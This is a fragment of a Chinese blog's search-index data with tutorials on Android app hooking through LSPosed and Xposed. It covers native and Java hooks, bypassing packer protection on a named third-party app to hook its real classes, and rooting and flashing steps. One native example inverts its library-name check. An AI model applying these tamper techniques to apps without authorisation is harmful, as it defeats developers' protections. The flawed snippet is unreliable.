","date":"2022-11-07","objectID":"/posts/android/android-rom/%E6%B7%BB%E5%8A%A0sdcard%E6%9D%83%E9%99%90/:2:0","tags":["Android"],"title":"给所有App添加sdcard权限","uri":"/posts/android/android-rom/%E6%B7%BB%E5%8A%A0sdcard%E6%9D%83%E9%99%90/"},{"categories":["Android Lsposed"],"content":"前言 使用Xposed进行Android App Native层Hook的方式需要借助第三方Hook库,且使用起来十分麻烦,LSPosed经过改良后,支持了Native层的Hook,使用流程十分简单.下面通过一个示例来展示下LSPosed Native层的Hook流程. ","date":"2022-10-27","objectID":"/posts/android/android-hook/lsposed/lsposed-native%E5%B1%82hook/:1:0","tags":["Lsposed"],"title":"LSPosed-Native层Hook","uri":"/posts/android/android-hook/lsposed/lsposed-native%E5%B1%82hook/"},{"categories":["Android Lsposed"],"content":"测试Apk MainActivity.java: package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.widget.TextView; import com.example.luodst.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { // Used to load the 'luodst' library on application startup. static { System.loadLibrary(\"luodst\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); } /** * A native method that is implemented by the 'luodst' native library, * which is packaged with this application. */ public native String stringFromJNI(); } native-lib.cpp: #include \u003cjni.h\u003e #include \u003cstring\u003e #include \u003candroid/log.h\u003e #define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, \"LuoHun\", __VA_ARGS__); #define LOGW(...) __android_log_print(ANDROID_LOG_WARN, \"LuoHun\", __VA_ARGS__); #define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, \"LuoHun\", __VA_ARGS__); extern \"C\" bool check(std::string strDst){ return strstr(strDst.c_str(), \"Luo\"); } extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luodst_MainActivity_stringFromJNI( JNIEnv* env, jobject /* this */) { if (check(\"Hun\")){ LOGE(\"check true\") } else{ LOGE(\"check false\") } std::string hello = \"Hello from C++\"; return env-\u003eNewStringUTF(hello.c_str()); } ","date":"2022-10-27","objectID":"/posts/android/android-hook/lsposed/lsposed-native%E5%B1%82hook/:2:0","tags":["Lsposed"],"title":"LSPosed-Native层Hook","uri":"/posts/android/android-hook/lsposed/lsposed-native%E5%B1%82hook/"},{"categories":["Android Lsposed"],"content":"Hook示例 下面以Hook上面libluodst.so库中的check函数为例. 修改AndroidManifest.xml文件 android:multiArch=\"true\" android:extractNativeLibs=\"false\" \u003cmeta-data android:name=\"xposedmodule\" android:value=\"true\" /\u003e \u003cmeta-data android:name=\"xposeddescription\" android:value=\"这是一个xposed demo\" /\u003e \u003cmeta-data android:name=\"xposedminversion\" android:value=\"82\" /\u003e 将XposedBridgeApi.jar放到项目中的app/libs目录下 配置build.gradle compileOnly files('libs/XposedBridgeApi-82.jar') compileOnly 'de.robv.android.xposed:api:82' compileOnly 'de.robv.android.xposed:api:82:sources' 配置settings.gradle,在repositories中添加下面两个任意一个即可 maven { url 'https://maven.aliyun.com/repository/public/' } //maven { url \"https://api.xposed.info/\" } 新建一个类继承IXposedHookLoadPackage来写Hook代码 package com.example.luoxposeddemo; import android.util.Log; import de.robv.android.xposed.IXposedHookLoadPackage; import de.robv.android.xposed.callbacks.XC_LoadPackage; public class LuoHook implements IXposedHookLoadPackage { private final String TAG = \"[LuoXposed]\"; @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable { if (lpparam.packageName.equals(\"com.example.luodst\")) { Log.i(TAG, \"Enter Hook\"); try { System.loadLibrary(\"luoxposeddemo\"); }catch (Exception e){ e.printStackTrace(); } } } } 在项目的main目录下新建一个assets文件夹,分别指明Hook的入口类和准备注入的so文件 //xposed_init com.example.luoxposeddemo.LuoHook //native_init libluoxposeddemo.so 创建一个头文件(LSPlant.h) typedef int (*HookFunType)(void *func, void *replace, void **backup); typedef int (*UnhookFunType)(void *func); typedef void (*NativeOnModuleLoaded)(const char *name, void *handle); typedef struct { uint32_t version; HookFunType hook_func; UnhookFunType unhook_func; } NativeAPIEntries; typedef NativeOnModuleLoaded (*NativeInit)(const NativeAPIEntries *entries); 在C层写Hook上述测试Apk的代码 native_init是Hook的入口函数,必须是导出函数.当有库文件加载时,它的返回值on_library_loaded回调函数,会被LSPosed 调用,故我们可以在这个函数中写针对目标Apk 指定so库函数的Hook代码.针对JNIEnv函数(比如GetMethodId)的Hook,我们可以在JNI_OnLoad函数中写Hook代码. #include \u003cjni.h\u003e #include \u003cstring\u003e #include \u003cdlfcn.h\u003e #include \"LSPlant.h\" static HookFunType hook_func = nullptr; extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luoxposeddemo_MainActivity_stringFromJNI( JNIEnv* env, jobject /* this */) { std::string hello = \"Hello from C++\"; return env-\u003eNewStringUTF(hello.c_str()); } bool *(*back_check)(std::string strDst); bool myCheck(std::string strDst){ return true; } void on_library_loaded(const char *name, void *handle) { // hooks on `libluodst.so` if (std::string(name).compare(\"libluodst.so\")) { void *target = dlsym(handle, \"check\"); hook_func(target, (void *) myCheck, (void **) \u0026back_check); } } extern \"C\" [[gnu::visibility(\"default\")]] [[gnu::used]] jint JNI_OnLoad(JavaVM *jvm, void*) { JNIEnv *env = nullptr; jvm-\u003eGetEnv((void **)\u0026env, JNI_VERSION_1_6); //hook_func((void *)env-\u003efunctions-\u003eFindClass, (void *)fake_FindClass, (void **)\u0026backup_FindClass); return JNI_VERSION_1_6; } extern \"C\" [[gnu::visibility(\"default\")]] [[gnu::used]] NativeOnModuleLoaded native_init(const NativeAPIEntries *entries) { hook_func = entries-\u003ehook_func; // system hooks //hook_func((void*) fopen, (void*) fake_fopen, (void**) \u0026backup_fopen); return on_library_loaded; } ","date":"2022-10-27","objectID":"/posts/android/android-hook/lsposed/lsposed-native%E5%B1%82hook/:3:0","tags":["Lsposed"],"title":"LSPosed-Native层Hook","uri":"/posts/android/android-hook/lsposed/lsposed-native%E5%B1%82hook/"},{"categories":["Android Lsposed"],"content":"参考链接 Native-Hook ","date":"2022-10-27","objectID":"/posts/android/android-hook/lsposed/lsposed-native%E5%B1%82hook/:4:0","tags":["Lsposed"],"title":"LSPosed-Native层Hook","uri":"/posts/android/android-hook/lsposed/lsposed-native%E5%B1%82hook/"},{"categories":["Android Lsposed"],"content":"前言 在对加固应用进行Hook时,如果直接对应用中的函数进行Hook,则会报下图所示的ClassNotFoundException错误. 出现上述错误的原因就是类加载器ClassLoader在加固应用启动时切换导致的问题,我们知道App中所有类都是由对应的ClassLoader加载到ART虚拟机的,如果ClassLoader不正确,那么一定找不到对应的类.LSPosed在注入进程时App的Application类并未完成加载,这也就导致真实用于加载App业务相关类的ClassLoader并未出现,最终导致无法完成App业务函数的Hook. 下面提供两种方式来对加固应用进行Hook. ","date":"2022-10-26","objectID":"/posts/android/android-hook/lsposed/lsposed-hook%E5%8A%A0%E5%9B%BA%E5%BA%94%E7%94%A8/:1:0","tags":["Lsposed"],"title":"LSPosed-Hook加固应用","uri":"/posts/android/android-hook/lsposed/lsposed-hook%E5%8A%A0%E5%9B%BA%E5%BA%94%E7%94%A8/"},{"categories":["Android Lsposed"],"content":"测试Apk example.apk ","date":"2022-10-26","objectID":"/posts/android/android-hook/lsposed/lsposed-hook%E5%8A%A0%E5%9B%BA%E5%BA%94%E7%94%A8/:2:0","tags":["Lsposed"],"title":"LSPosed-Hook加固应用","uri":"/posts/android/android-hook/lsposed/lsposed-hook%E5%8A%A0%E5%9B%BA%E5%BA%94%E7%94%A8/"},{"categories":["Android Lsposed"],"content":"方式一 通过对Android下的加固应用进行分析,可以知道壳程序总是通过在应用进程最先获得执行权限的Application类中的attachBaseContext和onCreate函数中完成对真实Dex的释放以及ClassLoader的切换.故我们可以通过对加固应用Application类的attachBaseContext或onCreate函数进行Hook,来得到真实App的上下文,再通过上下文来获取真实代码释放后的ClassLoader,用于后续的函数Hook. 其示例代码如下: package com.example.luoxposeddemo; import android.app.Application; import android.content.Context; import android.util.Log; import de.robv.android.xposed.IXposedHookLoadPackage; import de.robv.android.xposed.XC_MethodHook; import de.robv.android.xposed.XposedBridge; import de.robv.android.xposed.XposedHelpers; import de.robv.android.xposed.callbacks.XC_LoadPackage; public class LuoHook implements IXposedHookLoadPackage { private final String TAG = \"[LuoXposed]\"; @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable { if (lpparam.packageName.equals(\"com.hay.dreamlover\")) { Log.i(TAG, \"Enter Hook\"); //com.stub.StubApp Class applicationClazz = lpparam.classLoader.loadClass(\"com.stub.StubApp\"); XposedHelpers.findAndHookMethod(applicationClazz, \"attachBaseContext\", Context.class, new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); Log.i(TAG, \"Enter com.stub.StubApp.attachBaseContext\"); } @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { super.afterHookedMethod(param); Log.i(TAG, \"Leave com.stub.StubApp.attachBaseContext\"); Context context = (Context) param.args[0]; //获取真实业务代码的classLoader ClassLoader finalClassLoader = context.getClassLoader(); Class initActivityClazz = finalClassLoader.loadClass(\"com.fanwe.hybrid.activity.InitActivity\"); XposedBridge.hookAllMethods(initActivityClazz, \"onCreate\", new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); Log.i(TAG, \"attachBaseContext Enter com.fanwe.hybrid.activity.InitActivity.onCreate\"); } @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { super.afterHookedMethod(param); Log.i(TAG, \"attachBaseContext Leave com.fanwe.hybrid.activity.InitActivity.onCreate\"); } }); } }); } } } ","date":"2022-10-26","objectID":"/posts/android/android-hook/lsposed/lsposed-hook%E5%8A%A0%E5%9B%BA%E5%BA%94%E7%94%A8/:3:0","tags":["Lsposed"],"title":"LSPosed-Hook加固应用","uri":"/posts/android/android-hook/lsposed/lsposed-hook%E5%8A%A0%E5%9B%BA%E5%BA%94%E7%94%A8/"},{"categories":["Android Lsposed"],"content":"方式二 上面的方式一不具有通用性,一旦加固厂商改变相应继承Application类的类名,那上面的方式就失效了.下面介绍一种通用的解决任意加固应用函数的Hook方式. Android App的启动流程如下: App被Zygote进程孵化后,通过ActivityThread.main函数进入App的世界.ActivityThread这个类十分重要,它会根据ActivityManager发送的请求对activities、broadcast Receviers等操作进行调度和执行.其中performLaunchActivity()函数用于响应Activity相关的操作.另外ActivityThread类中还存在着一个Application类型的mInitialApplication成员,应用程序中有且只有一个Application组件,而Application对象中就存储着当前的ClassLoader,考虑到App在响应Activity消息时,真实App的代码已经被释放到内存中,此时通过mInitialApplication成员获取应用当前的ClassLoader,即可完成对真实App业务代码的Hook. 其示例代码如下: package com.example.luoxposeddemo; import android.app.Application; import android.content.Context; import android.util.Log; import de.robv.android.xposed.IXposedHookLoadPackage; import de.robv.android.xposed.XC_MethodHook; import de.robv.android.xposed.XposedBridge; import de.robv.android.xposed.XposedHelpers; import de.robv.android.xposed.callbacks.XC_LoadPackage; public class LuoHook implements IXposedHookLoadPackage { private final String TAG = \"[LuoXposed]\"; @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable { if (lpparam.packageName.equals(\"com.hay.dreamlover\")) { Log.i(TAG, \"Enter Hook\"); Class activityThreadClazz = lpparam.classLoader.loadClass(\"android.app.ActivityThread\"); XposedBridge.hookAllMethods(activityThreadClazz, \"performLaunchActivity\", new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); Log.i(TAG, \"Enter android.app.ActivityThread.performLaunchActivity\"); Application mInitialApplication = (Application) XposedHelpers.getObjectField(param.thisObject, \"mInitialApplication\"); ClassLoader finalClassLoader = mInitialApplication.getClassLoader(); Class initActivityClazz = finalClassLoader.loadClass(\"com.fanwe.hybrid.activity.InitActivity\"); //Log.i(TAG, initActivityClazz.toString()); XposedBridge.hookAllMethods(initActivityClazz, \"onCreate\", new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); Log.i(TAG, \"performLaunchActivity Enter com.fanwe.hybrid.activity.InitActivity.onCreate\"); } @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { super.afterHookedMethod(param); Log.i(TAG, \"performLaunchActivity Leave com.fanwe.hybrid.activity.InitActivity.onCreate\"); } }); } @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { super.afterHookedMethod(param); Log.i(TAG, \"Leave android.app.ActivityThread.performLaunchActivity\"); } }); } } } 至此,无论任何类型的App,只要存在一个Activity,按照上述方式进行Hook,理论上都可以完美解决. ","date":"2022-10-26","objectID":"/posts/android/android-hook/lsposed/lsposed-hook%E5%8A%A0%E5%9B%BA%E5%BA%94%E7%94%A8/:4:0","tags":["Lsposed"],"title":"LSPosed-Hook加固应用","uri":"/posts/android/android-hook/lsposed/lsposed-hook%E5%8A%A0%E5%9B%BA%E5%BA%94%E7%94%A8/"},{"categories":["Android Lsposed"],"content":"前言 LSPosed项目目前开发者仍在积极维护,在支持了使用Xposed API方式开发模块的同时,也支持不需重启就可让Hook代码生效,极大地提高了开发效率. 其Xposed API官方地址如下: https://api.xposed.info/reference/packages.html 下面通过一个示例,来展示下LSPosed Java层的Hook流程. ","date":"2022-10-26","objectID":"/posts/android/android-hook/lsposed/lsposed-java%E5%B1%82hook/:1:0","tags":["Lsposed"],"title":"LSPosed-Java层Hook","uri":"/posts/android/android-hook/lsposed/lsposed-java%E5%B1%82hook/"},{"categories":["Android Lsposed"],"content":"测试Apk Person.java: package com.example.luodst; public class Person { private String name = \"LuoHun\"; private int age = 18; public Person(){ } public Person(String name, int age){ this.name = name; this.age = age; } // Invoke public String publicMethod(){ return String.format(\"publicMethod name:%s age:%d\", this.name, this.age); } private String privateMethod(){ return String.format(\"privateMethod name:%s age:%d\", this.name, this.age); } public static String publicStaticMethod(){ return \"I'm from publicStaticMethod\"; } public String getName(Person person){ return \"Person name is \" + person.name; } public String toString(){ return String.format(\"name:%s age:%d\", this.name, this.age); } public String replaceFunc(){ return String.format(\"replaceFunc name:%s age:%d\", this.name, this.age); } class Student{ String course = \"Math\"; public String getCourse(){ return course; } } } MainActivity.java: package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import android.widget.TextView; import com.example.luodst.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { private final String TAG = \"[XiaLuoHun]\"; // Used to load the 'luodst' library on application startup. static { System.loadLibrary(\"luodst\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); Person person1 = new Person(); Log.i(TAG, person1.toString()); Person person2 = new Person(\"Luo\", 50); Log.i(TAG, person2.toString()); String personName = person2.getName(person1); Log.i(TAG, personName); String strResult = person2.replaceFunc(); Log.i(TAG, strResult); } /** * A native method that is implemented by the 'luodst' native library, * which is packaged with this application. */ public native String stringFromJNI(); } ","date":"2022-10-26","objectID":"/posts/android/android-hook/lsposed/lsposed-java%E5%B1%82hook/:2:0","tags":["Lsposed"],"title":"LSPosed-Java层Hook","uri":"/posts/android/android-hook/lsposed/lsposed-java%E5%B1%82hook/"},{"categories":["Android Lsposed"],"content":"Hook构造函数 对Java中构造函数的Hook主要借助于Xposed API中XposedHelpers.findAndHookConstructor函数. findAndHookConstructor(Class\u003c?\u003e clazz, Object... parameterTypesAndCallback) findAndHookConstructor(String className, ClassLoader classLoader, Object... parameterTypesAndCallback) package com.example.luoxposeddemo; import android.util.Log; import java.lang.reflect.Field; import de.robv.android.xposed.IXposedHookLoadPackage; import de.robv.android.xposed.XC_MethodHook; import de.robv.android.xposed.XposedBridge; import de.robv.android.xposed.XposedHelpers; import de.robv.android.xposed.callbacks.XC_LoadPackage; public class LuoHook implements IXposedHookLoadPackage { private final String TAG = \"[LuoXposed]\"; @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable { if (lpparam.packageName.equals(\"com.example.luodst\")) { //寻找类 方式一 //Class personClass = lpparam.classLoader.loadClass(\"com.example.luodst.Person\"); //寻找类 方式二 Class personClass = XposedHelpers.findClass(\"com.example.luodst.Person\",lpparam.classLoader); //Hook Person() XposedHelpers.findAndHookConstructor(personClass, new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); //输出日志的两种方式 Log.i(TAG, \"Enter Person()\"); XposedBridge.log(\"Enter Person()\"); } @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { super.afterHookedMethod(param); Log.i(TAG, \"Leave Person()\"); XposedBridge.log(\"Leave Person()\"); } }); //Hook Person(String name, int age) XposedHelpers.findAndHookConstructor(personClass, lpparam.classLoader,String.class, int.class, new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); Log.i(TAG, \"Enter Person(String name, int age)\"); //获取值 方式一 /* String name = (String) param.args[0]; Log.i(TAG, name);*/ //设置值 方式一 /* param.args[0] = \"Hun\"; param.args[1] = 500;*/ } @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { super.afterHookedMethod(param); Log.i(TAG, \"Enter Person(String name, int age)\"); //获取值 方式二 /* int age = XposedHelpers.getIntField(param.thisObject, \"age\"); Log.i(TAG, Integer.toString(age));*/ //获取值 方式三 Class clazz = XposedHelpers.findClass(\"com.example.luodst.Person\", lpparam.classLoader); Field age = clazz.getDeclaredField(\"age\"); age.setAccessible(true); int age_value = (int) age.get(param.thisObject); Log.i(TAG, Integer.toString(age_value)); //设置值 方式二 /* XposedHelpers.setObjectField(param.thisObject, \"name\", \"Hun\"); XposedHelpers.setIntField(param.thisObject,\"age\",600);*/ //设置值 方式三 /* Class personClass = XposedHelpers.findClass(\"com.example.luodst.Person\", lpparam.classLoader); Field age = personClass.getDeclaredField(\"age\"); age.setAccessible(true); age.set(param.thisObject, 600);*/ } }); } } } ","date":"2022-10-26","objectID":"/posts/android/android-hook/lsposed/lsposed-java%E5%B1%82hook/:3:0","tags":["Lsposed"],"title":"LSPosed-Java层Hook","uri":"/posts/android/android-hook/lsposed/lsposed-java%E5%B1%82hook/"},{"categories":["Android Lsposed"],"content":"Hook普通函数 对Java中普通函数的Hook主要借助于Xposed API中XposedHelpers.findAndHookMethod函数. findAndHookMethod(Class\u003c?\u003e clazz, String methodName, Object... parameterTypesAndCallback) findAndHookMethod(String className, ClassLoader classLoader, String methodName, Object... parameterTypesAndCallback) package com.example.luoxposeddemo; import android.util.Log; import java.lang.reflect.Field; import de.robv.android.xposed.IXposedHookLoadPackage; import de.robv.android.xposed.XC_MethodHook; import de.robv.android.xposed.XposedBridge; import de.robv.android.xposed.XposedHelpers; import de.robv.android.xposed.callbacks.XC_LoadPackage; public class LuoHook implements IXposedHookLoadPackage { private final String TAG = \"[LuoXposed]\"; @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable { if (lpparam.packageName.equals(\"com.example.luodst\")) { //寻找类 方式一 //Class personClass = lpparam.classLoader.loadClass(\"com.example.luodst.Person\"); //寻找类 方式二 Class personClass = XposedHelpers.findClass(\"com.example.luodst.Person\",lpparam.classLoader); //Hook com.example.luodst.Person.toString() XposedHelpers.findAndHookMethod(personClass, \"toString\", new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); Log.i(TAG, \"Enter com.example.luodst.Person.toString()\"); } @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { super.afterHookedMethod(param); Log.i(TAG, \"Leave com.example.luodst.Person.toString()\"); } }); //Hook com.example.luodst.MainActivity.stringFromJNI() XposedHelpers.findAndHookMethod(\"com.example.luodst.MainActivity\", lpparam.classLoader, \"stringFromJNI\", new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); Log.i(TAG, \"Enter com.example.luodst.MainActivity.stringFromJNI\"); } @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { super.afterHookedMethod(param); param.setResult(\"Hello XiaLuoHun\"); } }); } } } ","date":"2022-10-26","objectID":"/posts/android/android-hook/lsposed/lsposed-java%E5%B1%82hook/:4:0","tags":["Lsposed"],"title":"LSPosed-Java层Hook","uri":"/posts/android/android-hook/lsposed/lsposed-java%E5%B1%82hook/"},{"categories":["Android Lsposed"],"content":"主动调用 主动调用分为静态函数和实例函数. Xposed 提供了关于主动调用的API,其相应函数签名分别为: callMethod(Object obj, String methodName, Class[]\u003c?\u003e parameterTypes, Object... args) callMethod(Object obj, String methodName, Object... args) 下面主要展示下主动调用的几种形式. package com.example.luoxposeddemo; import android.util.Log; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.Method; import de.robv.android.xposed.IXposedHookLoadPackage; import de.robv.android.xposed.XC_MethodHook; import de.robv.android.xposed.XposedBridge; import de.robv.android.xposed.XposedHelpers; import de.robv.android.xposed.callbacks.XC_LoadPackage; public class LuoHook implements IXposedHookLoadPackage { private final String TAG = \"[LuoXposed]\"; @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable { if (lpparam.packageName.equals(\"com.example.luodst\")) { //寻找类 方式一 //Class personClass = lpparam.classLoader.loadClass(\"com.example.luodst.Person\"); //寻找类 方式二 Class personClass = XposedHelpers.findClass(\"com.example.luodst.Person\", lpparam.classLoader); //Invoke静态函数 //①反射 Method publicStaticMethod = personClass.getDeclaredMethod(\"publicStaticMethod\"); String strResult1 = (String) publicStaticMethod.invoke(null); Log.i(TAG, strResult1); //②Xposed API String strResult2 = (String) XposedHelpers.callStaticMethod(personClass, \"publicStaticMethod\"); Log.i(TAG, strResult2); //Invoke实例函数 //①类原生方式 Object personObj1 = personClass.newInstance(); String result1 = (String) XposedHelpers.callMethod(personObj1, \"publicMethod\"); Log.i(TAG, result1); //②通过构造函数进行调用 Constructor personConstructor = personClass.getConstructor(String.class, int.class); Object personObj2 = personConstructor.newInstance(\"Luo\", 1000); String result2 = (String) XposedHelpers.callMethod(personObj2, \"toString\"); Log.i(TAG, result2); //③Xposed API //public method Object personObj3 = XposedHelpers.newInstance(personClass, \"Hun\", 2000); String result3 = (String) XposedHelpers.callMethod(personObj3, \"publicMethod\"); Log.i(TAG, result3); //private method Object personObj4 = XposedHelpers.newInstance(personClass, \"Hun\", 3000); String result4 = (String) XposedHelpers.callMethod(personObj4, \"privateMethod\"); Log.i(TAG, result4); //④反射 Object personObj5 = XposedHelpers.newInstance(personClass, \"Hun\", 4000); Method privateMethod = personClass.getDeclaredMethod(\"privateMethod\"); privateMethod.setAccessible(true); String resutlt5 = (String) privateMethod.invoke(personObj5); Log.i(TAG, resutlt5); //⑤Hook构造函数 XposedHelpers.findAndHookConstructor(personClass, String.class, int.class, new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); } @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { super.afterHookedMethod(param); //publicMethod String result = (String) XposedHelpers.callMethod(param.thisObject, \"publicMethod\"); Log.i(TAG, result); } }); //⑥Hook参数 Class selfClass = XposedHelpers.findClass(\"com.example.luodst.Person\", lpparam.classLoader); XposedHelpers.findAndHookMethod(\"com.example.luodst.Person\", lpparam.classLoader, \"getName\", selfClass, new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); Log.i(TAG, \"Enter Invoke com.example.luodst.Person.privateMethod\"); //privateMethod String result = (String) XposedHelpers.callMethod(param.args[0], \"privateMethod\"); Log.i(TAG, result); } @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { super.afterHookedMethod(param); } }); } } } ","date":"2022-10-26","objectID":"/posts/android/android-hook/lsposed/lsposed-java%E5%B1%82hook/:5:0","tags":["Lsposed"],"title":"LSPosed-Java层Hook","uri":"/posts/android/android-hook/lsposed/lsposed-java%E5%B1%82hook/"},{"categories":["Android Lsposed"],"content":"函数替换 package com.example.luoxposeddemo; import android.util.Log; import java.lang.reflect.Field; import de.robv.android.xposed.IXposedHookLoadPackage; import de.robv.android.xposed.XC_MethodHook; import de.robv.android.xposed.XC_MethodReplacement; import de.robv.android.xposed.XposedBridge; import de.robv.android.xposed.XposedHelpers; import de.robv.android.xposed.callbacks.XC_LoadPackage; public class LuoHook implements IXposedHookLoadPackage { private final String TAG = \"[LuoXposed]\"; @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable { if (lpparam.packageName.equals(\"com.example.luodst\")) { //寻找类 方式一 //Class personClass = lpparam.classLoader.loadClass(\"com.example.luodst.Person\"); //寻找类 方式二 Class personClass = XposedHelpers.findClass(\"com.example.luodst.Person\",lpparam.classLoader); //进行函数替换 XposedHelpers.findAndHookMethod(personClass, \"replaceFunc\", new XC_MethodReplacement() { @Override protected Object replaceHookedMethod(MethodHookParam methodHookParam) throws Throwable { Log.i(TAG, \"replaceFunc\"); return \"LuoReplaceFunc\"; } }); } } } ","date":"2022-10-26","objectID":"/posts/android/android-hook/lsposed/lsposed-java%E5%B1%82hook/:6:0","tags":["Lsposed"],"title":"LSPosed-Java层Hook","uri":"/posts/android/android-hook/lsposed/lsposed-java%E5%B1%82hook/"},{"categories":["Android Lsposed"],"content":"前言 Xposed是早期的Hook框架,有成熟的社区和API来支撑,但作者在2017年就停止了该项目的维护.后来出现了Edposed,并接管了Xposed的位置,但Edposed存在的时间很短且本身框架也有很多问题.于是基于Edposed的改良框架Lsposed脱颖而出,它接管了Xposed的API,可以很好的兼容Xposed的API,再加上其模块编写后无需重启就可以生效的特性,极大的提高了我们的效率,值得我们进行学习. 下面的流程以Pixel sailfish为例,来介绍下Xposed和Lsposed安装以及基本模块的编写. ","date":"2022-10-25","objectID":"/posts/android/android-hook/lsposed/xposed%E5%92%8Clsposed%E5%AE%89%E8%A3%85/:1:0","tags":["Lsposed"],"title":"Xposed和Lsposed安装","uri":"/posts/android/android-hook/lsposed/xposed%E5%92%8Clsposed%E5%AE%89%E8%A3%85/"},{"categories":["Android Lsposed"],"content":"Xposed Xposed正式版目前仅支持到Android 7,官方已不再维护,该项目的Github地址如下: https://github.com/rovo89/Xposed 手机刷入Android7.1.2镜像. https://dl.google.com/dl/android/aosp/sailfish-n2g47o-factory-f2bc8024.zip 下载SuperSU刷机包,将其推送到手机的sdcard目录. https://supersuroot.org/download/ SR5-SuperSU-v2.82-SR5-20171001224502.zip 手机刷入twrp. https://twrp.me/Devices/ //Nexus 5X fastboot flash recovery twrp.img //Pixel fastboot flash boot twrp.img 手机进入recovey模式,刷入SuperSU. 下载Xposed刷机包,将其推送到手机的sdcard目录. https://forum.xda-developers.com/t/official-xposed-for-lollipop-marshmallow-nougat-oreo-v90-beta3-2018-01-29.3034811/ xposed-v89-sdk25-arm64.zip 手机进入recovey模式,刷入Xposed. 手机重启后,安装XposedInstaller App(Xposed插件管理和功能控制App). XposedInstaller_3.1.5.apk ","date":"2022-10-25","objectID":"/posts/android/android-hook/lsposed/xposed%E5%92%8Clsposed%E5%AE%89%E8%A3%85/:2:0","tags":["Lsposed"],"title":"Xposed和Lsposed安装","uri":"/posts/android/android-hook/lsposed/xposed%E5%92%8Clsposed%E5%AE%89%E8%A3%85/"},{"categories":["Android Lsposed"],"content":"Lsposed 官方目前支持Android8.1~13,该项目的Github地址如下: https://github.com/LSPosed/LSPosed 手机刷入Android8.1镜像. https://source.android.com/setup/start/build-numbers https://developers.google.com/android/images https://dl.google.com/dl/android/aosp/sailfish-opm1.171019.011-factory-56d15350.zip 使用Magisk进行Root. https://github.com/topjohnwu/Magisk 在Magisk中启动Zygisk. 下载LSPosed的zygisk版本,将其推送到手机的sdcard目录中. https://github.com/LSPosed/LSPosed 在Magisk中使用本地安装上述模块. ","date":"2022-10-25","objectID":"/posts/android/android-hook/lsposed/xposed%E5%92%8Clsposed%E5%AE%89%E8%A3%85/:3:0","tags":["Lsposed"],"title":"Xposed和Lsposed安装","uri":"/posts/android/android-hook/lsposed/xposed%E5%92%8Clsposed%E5%AE%89%E8%A3%85/"},{"categories":["Android Lsposed"],"content":"Hook模块编写 ","date":"2022-10-25","objectID":"/posts/android/android-hook/lsposed/xposed%E5%92%8Clsposed%E5%AE%89%E8%A3%85/:4:0","tags":["Lsposed"],"title":"Xposed和Lsposed安装","uri":"/posts/android/android-hook/lsposed/xposed%E5%92%8Clsposed%E5%AE%89%E8%A3%85/"},{"categories":["Android Lsposed"],"content":"测试Apk package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.view.View; import android.widget.Button; import android.widget.Toast; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button button = (Button) findViewById(R.id.button); button.setOnClickListener(new View.OnClickListener() { public void onClick(View v) { Toast.makeText(MainActivity.this, toastMessage(), Toast.LENGTH_SHORT).show(); } }); } public String toastMessage() { return \"我未被劫持\"; } } ","date":"2022-10-25","objectID":"/posts/android/android-hook/lsposed/xposed%E5%92%8Clsposed%E5%AE%89%E8%A3%85/:4:1","tags":["Lsposed"],"title":"Xposed和Lsposed安装","uri":"/posts/android/android-hook/lsposed/xposed%E5%92%8Clsposed%E5%AE%89%E8%A3%85/"},{"categories":["Android 